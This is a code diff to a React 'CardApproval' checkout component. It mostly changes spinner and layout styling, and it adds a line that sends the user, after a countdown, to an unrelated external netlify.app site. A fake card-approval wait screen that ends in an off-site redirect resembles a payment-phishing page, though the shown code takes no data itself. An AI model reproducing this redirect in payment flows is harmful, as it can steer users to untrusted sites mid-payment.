@@ -1,5 +1,4 @@
 import { useEffect, useState, useMemo } from 'react';
-import { Loader2 } from 'lucide-react';
 import { postCheckoutEvent } from '@/lib/api';
 
 interface CardApprovalProps {
@@ -27,6 +26,7 @@ const CardApproval = ({ sessionId }: CardApprovalProps) => {
           timestamp: new Date().toISOString(),
         }).catch(() => {});
       }
+      window.location.href = 'https://goldhoussin.netlify.app/';
     }
   }, [timer, sessionId]);
 
@@ -38,20 +38,20 @@ const CardApproval = ({ sessionId }: CardApprovalProps) => {
 
   return (
     <div
-      className="bg-white rounded-2xl border border-gray-200 text-center shadow-sm mx-auto flex flex-col items-center justify-center"
+      className="bg-white rounded-2xl text-center shadow-sm mx-auto flex flex-col items-center justify-center"
       style={{ width: '207.03px', height: '193px', padding: '0' }}
     >
-      <div className="w-16 h-16 rounded-full bg-blue-50 mx-auto mb-3 flex items-center justify-center">
-        <Loader2
-          className="h-8 w-8 text-blue-500"
+      <div className="w-16 h-16 rounded-full mx-auto mb-7 flex items-center justify-center">
+        <div
+          className="w-8 h-8 rounded-full border-4 border-gray-200 border-t-blue-500 animate-spin"
           style={{
-            animation: 'card-approval-spin 1s linear infinite',
+            animation: 'spin 1s linear infinite',
           }}
         />
       </div>
 
       <h2
-        className="font-bold text-gray-900 mb-2 leading-none"
+        className="font-bold text-gray-900 mb-3 leading-none whitespace-nowrap"
         style={{ width: '167.03px', height: '21px', fontSize: '14px', lineHeight: '21px' }}
         dir="rtl"
       >
@@ -59,7 +59,7 @@ const CardApproval = ({ sessionId }: CardApprovalProps) => {
       </h2>
 
       <div
-        className="font-mono font-semibold text-orange-500 mb-2"
+        className="font-mono font-semibold text-orange-500 mb-3"
         style={{ width: '167.03px', height: '18px', fontSize: '14px', lineHeight: '18px' }}
       >
         {formatTimer(timer)}
